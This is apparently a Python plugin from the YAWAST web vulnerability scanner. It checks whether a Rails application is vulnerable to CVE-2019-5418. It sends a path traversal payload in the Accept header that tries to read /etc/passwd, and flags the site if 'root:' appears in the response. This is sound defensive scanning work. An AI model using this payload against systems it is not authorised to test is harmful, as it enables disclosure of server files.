from typing import List

from yawast.reporting.enums import Vulnerabilities
from yawast.scanner.plugins.http import response_scanner
from yawast.scanner.plugins.result import Result
from yawast.shared import network


def check_cve_2019_5418(url: str) -> List[Result]:
    # this only applies to controllers, so skip the check unless the link ends with '/'
    if not url.endswith("/"):
        return []

    results = []

    res = network.http_get(
        url, False, {"Accept": "../../../../../../../../../etc/passwd{{"}
    )
    body = res.text
    req = network.http_build_raw_request(res.request)

    results += response_scanner.check_response(url, res)

    if "root:" in body:
        results.append(
            Result(
                f"Rails CVE-2019-5418: File Content Disclosure: {url}",
                Vulnerabilities.SERVER_RAILS_CVE_2019_5418,
                url,
                [body, req],
            )
        )

    return results
